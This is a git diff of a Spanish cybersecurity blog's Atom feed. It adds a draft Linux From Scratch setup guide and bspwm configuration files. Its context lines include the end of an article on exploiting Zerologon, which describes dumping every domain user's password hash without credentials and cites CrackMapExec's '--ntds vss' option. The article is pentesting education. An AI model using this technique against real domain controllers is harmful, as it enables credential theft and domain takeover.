@@ -1,4 +1,141 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-26T18:14:05+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">jflabur.io</title><subtitle>Artículos sobre ciberseguridad, CTFs e investigaciones</subtitle><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><entry><title type="html">popopp</title><link href="http://localhost:4000/popopp/" rel="alternate" type="text/html" title="popopp" /><published>2020-10-26T00:00:00+01:00</published><updated>2020-10-26T00:00:00+01:00</updated><id>http://localhost:4000/popopp</id><content type="html" xml:base="http://localhost:4000/popopp/">&lt;p&gt;popopopopop&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><summary type="html">popopopopop</summary></entry><entry><title type="html">Cómo explotar la vulnerabilidad Zerologon</title><link href="http://localhost:4000/como-explotar-vulnerabilidad-zerologon/" rel="alternate" type="text/html" title="Cómo explotar la vulnerabilidad Zerologon" /><published>2020-09-16T00:00:00+02:00</published><updated>2020-09-16T00:00:00+02:00</updated><id>http://localhost:4000/como-explotar-vulnerabilidad-zerologon</id><content type="html" xml:base="http://localhost:4000/como-explotar-vulnerabilidad-zerologon/">&lt;p&gt;&lt;img src=&quot;/assets/images/zerologon/zerologon.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-27T09:38:20+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">jflabur.io</title><subtitle>Artículos sobre ciberseguridad, CTFs e investigaciones</subtitle><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><entry><title type="html">popopp</title><link href="http://localhost:4000/popopp/" rel="alternate" type="text/html" title="popopp" /><published>2020-10-26T00:00:00+01:00</published><updated>2020-10-26T00:00:00+01:00</updated><id>http://localhost:4000/popopp</id><content type="html" xml:base="http://localhost:4000/popopp/">&lt;h2 id=&quot;índice-y-estructura-principal&quot;&gt;Índice y Estructura Principal&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#version-check&quot;&gt;Version Check&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#creando-nueva-particion&quot;&gt;Creando nueva particion&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#primero&quot;&gt;primero&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;antecedentesss&quot;&gt;Antecedentesss&lt;/h1&gt;
+&lt;p&gt;Antes que nada, me gustaría comentar una serie de puntos para aquellos que pretenden seguir esta guía.&lt;/p&gt;
+
+&lt;h4 id=&quot;por-qué-crear-un-sistema-linux-desde-0-manualmente-en-vez-de-descargar-e-instalar-uno-existente&quot;&gt;¿Por qué crear un sistema Linux desde 0 manualmente en vez de descargar e instalar uno existente?&lt;/h4&gt;
+
+&lt;p&gt;Bueno, si te estás haciendo esta pregunta es que lo tuyo no es la curiosidad.&lt;/p&gt;
+
+&lt;p&gt;La idea de esta guía es que te sirva de ayuda para entender y aprender cómo funciona un sistema Linux desde adentro hacia afuera. Construir un sistema LFS desde 0 te ayuda a entender qué hace que Linux funcione y cómo las cosas funcionan a bajo nivel.&lt;/p&gt;
+
+&lt;p&gt;Aparte, una de las mejores cosas que se pueden sacar de provecho de todo esto es la capacidad de personalizar un sistema Linux para satisfacer tus propias necesidades únicas. No me considero un paranoico, pero en muchas distribuciones Linux no es la primera vez que me encuentro con un binario ya previamente compilado cuyo código no puedo ver (por no ser Open Source)… y a saber qué lleva dentro, igual hasta viene con regalo.&lt;/p&gt;
+
+&lt;p&gt;En ese sentido, tal vez por pura prevención (y curiosidad), a veces es mejor tener el control de qué cosas son las que se están instalando en el sistema, ¿no crees?.&lt;/p&gt;
+
+&lt;h4 id=&quot;prerrequisitos&quot;&gt;Prerrequisitos&lt;/h4&gt;
+
+&lt;p&gt;Construir un sistema LFS no es una tarea simple. Para toda esta guía, se requiere un cierto nivel de conocimiento existente sobre la administración del sistema Unix. Si esto es así y se aplica para tu caso… a por ello.&lt;/p&gt;
+
+&lt;p&gt;Otro de los requisitos que se requieren es la &lt;strong&gt;paciencia&lt;/strong&gt;. Construir un sistema LFS no se hace en un día (creedme, lo he intentado), algunos paquetes tardan mucho en instalarse y hay algunas fases que de por sí requieren de tiempo.&lt;/p&gt;
+
+&lt;p&gt;El tiempo estimado para construir tu propio sistema Linux oscila entre &lt;strong&gt;3 y 5 días&lt;/strong&gt;, para que lo tengáis en cuenta.&lt;/p&gt;
+
+&lt;h1 id=&quot;introducción&quot;&gt;INTRODUCCIÓN&lt;/h1&gt;
+&lt;h4 id=&quot;consideraciones&quot;&gt;Consideraciones&lt;/h4&gt;
+
+&lt;p&gt;Bueno antes de empezar, deciros que en mi caso voy a estar trabajando con VirtualBox.&lt;/p&gt;
+
+&lt;p&gt;La pregunta que probablemente os hagáis es, ¿y no puedo usar VMware?, pues a ver, por poder podéis… PERO de las veces que he probado con VMware, justo en la fase final a la hora de hacer el Reboot… aparece un &lt;strong&gt;Kernel Panic&lt;/strong&gt;, con el cual me estuve peleando en su momento y no encontré forma de arreglarlo.&lt;/p&gt;
+
+&lt;p&gt;Si queréis no tener que estar lidiando con estos problemas, mi recomendación es que lo hagáis todo con &lt;strong&gt;Virtual Box&lt;/strong&gt;. Por lo demás, hay que tener en cuenta que para construir tu propio sistema Linux, necesitas primero de una distribución Linux de base sobre la que trabajar, ya que es desde esta desde donde estaremos toqueteando nuestro nuevo disco duro virtual que posteriormente crearemos.&lt;/p&gt;
+
+&lt;p&gt;En mi caso, estaré trabajando con un &lt;strong&gt;Debian 10.3.0 amd64&lt;/strong&gt;, el cual puedes descargar desde la página oficial:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://www.debian.org/distrib/netinst&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;version-check&quot;&gt;Version Check&lt;/h2&gt;
+
+&lt;p&gt;Una vez instalados todos los paquetes, ejecutaremos los siguientes comandos para crear una serie de links simbólicos necesarios para que todo funcione correctamente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-svf&lt;/span&gt; bison /usr/bin/yacc
+&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-svf&lt;/span&gt; gawk /usr/bin/awk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya con esto hecho, ejecutaremos el script &lt;strong&gt;version-check.sh&lt;/strong&gt; previamente creado y analizamos si nos da algún error:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+     &lt;img src=&quot;https://funkyimg.com/i/346BS.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como vemos, no se nos reporta ningún error… por lo que podremos continuar. Si en este punto se te arroja algún error, es que has metido la pata en algún sitio y no has instalado correctamente algún paquete necesario.&lt;/p&gt;
+
+&lt;p&gt;¿Mi recomendación en este punto?, crea una instantánea, no vaya a ser que en breve la líes y tengas que volver a empezar desde 0… así por lo menos te das el margen de empezar desde aquí:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+     &lt;img src=&quot;https://funkyimg.com/i/346C9.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;creando-nueva-particion&quot;&gt;Creando nueva particion&lt;/h2&gt;
+
+&lt;p&gt;En este punto, ya con todo lo anterior correctamente configurado, lo que haremos será apagar la máquina virtual. Nos iremos a la configuración de nuestra máquina, y añadiremos un nuevo disco… donde irá el LFS:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+     &lt;img src=&quot;https://funkyimg.com/i/346Dx.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&amp;lt;br&lt;/p&gt;
+
+&lt;p&gt;Una vez más, será de tipo &lt;strong&gt;VDI&lt;/strong&gt;. En la selección del tipo de almacenamiento en unidad de disco duro física, indicaremos que queremos trabajar con un tamaño fijo:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+     &lt;img src=&quot;https://funkyimg.com/i/346Dy.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Posteriormente, identificamos el &lt;strong&gt;VDI&lt;/strong&gt; donde irá nuestro nuevo sistema Linux con un nombre descriptivo. Yo lo llamaré &lt;strong&gt;S4viOS&lt;/strong&gt; (30 GB):&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+     &lt;img src=&quot;https://funkyimg.com/i/346Dz.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez creado, lo que hacemos es añadirlo justo debajo del ya existente correspondiente al Debian:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+     &lt;img src=&quot;https://funkyimg.com/i/346DA.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez añadido, debería verse tal que así:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+     &lt;img src=&quot;https://funkyimg.com/i/346DB.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si arrancamos el Debian, todo debería continuar funcionando correctamente.&lt;/p&gt;
+
+&lt;p&gt;Al aplicar el comando &lt;strong&gt;lsblk&lt;/strong&gt;, deberíamos ver una nueva partición en &lt;strong&gt;/dev/sdb&lt;/strong&gt;, correspondiente a la que hemos creado para &lt;strong&gt;S4viOS&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+     &lt;img src=&quot;https://funkyimg.com/i/346DC.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;¡Importante en este punto antes de continuar!&lt;/strong&gt;, como de aquí en adelante es probable que nos encontremos con fases de larga espera, lo mejor es quitar esto que nos sale cuando estamos inactivos:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+     &lt;img src=&quot;https://funkyimg.com/i/346EU.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;No creo que nos haga mucha gracia que en una plena instalación se nos apague de pronto el equipo por inactividad. Para quitar este modo, buscamos ‘&lt;strong&gt;Energía&lt;/strong&gt;’ en el buscador de herramientas, y ponemos la siguiente configuración:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+     &lt;img src=&quot;https://funkyimg.com/i/346F1.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;primero&quot;&gt;primero&lt;/h2&gt;
+
+&lt;p&gt;Una vez instalados todos los paquetes, ejecutaremos los siguientes comandos para crear una serie de links simbólicos necesarios para que todo funcione correctamente:&lt;/p&gt;
+
+&lt;p&gt;¡Un saludo y que os sea leve!&lt;/p&gt;
+
+&lt;p&gt;¡Un saludo y que os sea leve!&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><summary type="html">Índice y Estructura Principal</summary></entry><entry><title type="html">Cómo explotar la vulnerabilidad Zerologon</title><link href="http://localhost:4000/como-explotar-vulnerabilidad-zerologon/" rel="alternate" type="text/html" title="Cómo explotar la vulnerabilidad Zerologon" /><published>2020-09-16T00:00:00+02:00</published><updated>2020-09-16T00:00:00+02:00</updated><id>http://localhost:4000/como-explotar-vulnerabilidad-zerologon</id><content type="html" xml:base="http://localhost:4000/como-explotar-vulnerabilidad-zerologon/">&lt;p&gt;&lt;img src=&quot;/assets/images/zerologon/zerologon.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;es-realmente-crítico-zerologon&quot;&gt;¿Es realmente crítico Zerologon?&lt;/h2&gt;
 
@@ -102,7 +239,869 @@ Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14103/141
 &lt;img src=&quot;/assets/images/zerologon/4.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;Conseguimos listar los hashes de todos los usuarios existentes a nivel de dominio, incluido aquellos que sean administradores del dominio. Básicamente el mismo efecto que obtendríamos si desde CrackMapExec hubiéramos hecho uso de la acción &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--ntds vss&lt;/code&gt;, pero claro… en ese caso habríamos necesitado credenciales válidas, lo bueno del Zerologon es que no hace falta nada de eso :)&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Research" /><category term="Utilidades" /><category term="Exploits" /><category term="Vulnerabilidades" /><category term="Pentesting" /><category term="Herramientas" /><category term="Windows" /><category term="Linux" /><category term="Domain Controller" /><category term="Guías" /><category term="Privilege Escalation" /><summary type="html">Mucho se está hablando acerca de la nueva vulnerabilidad Zerologon, pero... ¿realmente es crítica?. Lo analizaremos en detalle en este artículo.</summary></entry><entry><title type="html">Cómo construir tu propio sistema Linux</title><link href="http://localhost:4000/como-crear-un-sistema-linux/" rel="alternate" type="text/html" title="Cómo construir tu propio sistema Linux" /><published>2020-04-23T00:00:00+02:00</published><updated>2020-04-23T00:00:00+02:00</updated><id>http://localhost:4000/como-crear-un-sistema-linux</id><content type="html" xml:base="http://localhost:4000/como-crear-un-sistema-linux/">&lt;h1 id=&quot;cómo-construir-tu-propio-sistema-linux-s4vios&quot;&gt;Cómo construir tu propio sistema Linux (S4viOS)&lt;/h1&gt;
+&lt;p&gt;Conseguimos listar los hashes de todos los usuarios existentes a nivel de dominio, incluido aquellos que sean administradores del dominio. Básicamente el mismo efecto que obtendríamos si desde CrackMapExec hubiéramos hecho uso de la acción &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--ntds vss&lt;/code&gt;, pero claro… en ese caso habríamos necesitado credenciales válidas, lo bueno del Zerologon es que no hace falta nada de eso :)&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Research" /><category term="Utilidades" /><category term="Exploits" /><category term="Vulnerabilidades" /><category term="Pentesting" /><category term="Herramientas" /><category term="Windows" /><category term="Linux" /><category term="Domain Controller" /><category term="Guías" /><category term="Privilege Escalation" /><summary type="html">Mucho se está hablando acerca de la nueva vulnerabilidad Zerologon, pero... ¿realmente es crítica?. Lo analizaremos en detalle en este artículo.</summary></entry><entry><title type="html">Cómo configurar un buen entorno de trabajo en Linux</title><link href="http://localhost:4000/bspwm-configuration-files/" rel="alternate" type="text/html" title="Cómo configurar un buen entorno de trabajo en Linux" /><published>2020-08-29T03:00:00+02:00</published><updated>2020-08-29T03:00:00+02:00</updated><id>http://localhost:4000/bspwm-configuration-files</id><content type="html" xml:base="http://localhost:4000/bspwm-configuration-files/">&lt;p&gt;&lt;img src=&quot;/assets/images/bspwm/bspwm-background.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para el que no sepa de lo que estamos hablando, toda la configuración que se define en este artículo es la detallada en el siguiente vídeo mi canal de YouTube:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=MF4qRSedmEs&quot;&gt;Cómo configurar un buen entorno de trabajo en Linux&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Algunos de vosotros me habéis contactado pidiéndome que subiera los archivos de configuración a algún sitio, dado que a pesar de seguir mis pasos, os aparecían errores en ciertas cosas.&lt;/p&gt;
+
+&lt;p&gt;Para el que lo quiera tomar en consideración, por aquí os dejo las especificaciones de mi sistema operativo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[jflabur@parrot]─[~]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+Linux parrot 5.2.0-2parrot1-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 5.2.9-2parrot1 (2019-08-25) x86_64 GNU/Linux&lt;/span&gt;
+Linux parrot 5.8.0-2parrot1-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 5.8.10-2parrot1 (2020-10-05) x86_64 GNU/Linux&lt;/span&gt;
+
+┌─[jflabur@parrot]─[~]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$lsb_release&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+No LSB modules are available.
+Distributor ID:	Parrot
+Description:	Parrot GNU/Linux 4.10
+Release:	4.10
+Codename:	n/a
+┌─[jflabur@parrot]─[~]
+└──╼ &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;archivo-bspwmrc&quot;&gt;Archivo bspwmrc&lt;/h2&gt;
+
+&lt;p&gt;Este sería el archivo de configuración situado bajo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/bspwm&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#! /bin/sh&lt;/span&gt;
+
+sxhkd &amp;amp;
+compton &lt;span class=&quot;nt&quot;&gt;--config&lt;/span&gt; /home/jflabur/.config/compton/compton.conf &amp;amp;
+feh &lt;span class=&quot;nt&quot;&gt;--bg-fill&lt;/span&gt; /home/jflabur/Desktop/jflabur/Images/graffiti.jpg &amp;amp;
+wmname LG3D &amp;amp;
+~/.config/polybar/launch.sh &amp;amp;
+
+bspc config pointer_modifier mod1
+
+bspc monitor &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; I II III IV V VI VII VIII IX X
+
+bspc config border_width         2
+bspc config window_gap          12
+
+bspc config split_ratio          0.52
+bspc config borderless_monocle   &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;bspc config gapless_monocle      &lt;span class=&quot;nb&quot;&gt;true
+
+&lt;/span&gt;bspc rule &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; Caja &lt;span class=&quot;nv&quot;&gt;desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'^8'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;floating &lt;span class=&quot;nv&quot;&gt;follow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on
+bspc rule &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; Gimp &lt;span class=&quot;nv&quot;&gt;desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'^8'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;floating &lt;span class=&quot;nv&quot;&gt;follow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on
+bspc rule &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; Chromium &lt;span class=&quot;nv&quot;&gt;desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'^2'&lt;/span&gt;
+bspc rule &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; mplayer2 &lt;span class=&quot;nv&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;floating
+bspc rule &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; Kupfer.py &lt;span class=&quot;nv&quot;&gt;focus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on
+bspc rule &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; Screenkey &lt;span class=&quot;nv&quot;&gt;manage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;off
+bspc rule &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; burp-StartBurp: &lt;span class=&quot;nv&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;floating
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;archivo-bspwm_resize&quot;&gt;Archivo bspwm_resize&lt;/h2&gt;
+
+&lt;p&gt;Este sería el archivo de configuración situado bajo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/bspwm/scripts/&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env dash&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;bspc query &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; focused.floating &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;step&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;20
+&lt;span class=&quot;k&quot;&gt;else
+        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;step&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100
+&lt;span class=&quot;k&quot;&gt;fi
+
+case&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
+        &lt;/span&gt;west&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;right&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;falldir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;left&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$step&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+        east&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;right&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;falldir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;left&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$step&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+        north&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;top&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;falldir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bottom&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$step&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+        south&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;top&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;falldir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bottom&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$step&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;
+
+bspc node &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$y&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; bspc node &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$falldir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$y&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;archivo-comptonconf&quot;&gt;Archivo compton.conf&lt;/h2&gt;
+
+&lt;p&gt;Este sería el archivo de configuración situado bajo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/compton&lt;/code&gt;:&lt;/p&gt;
+
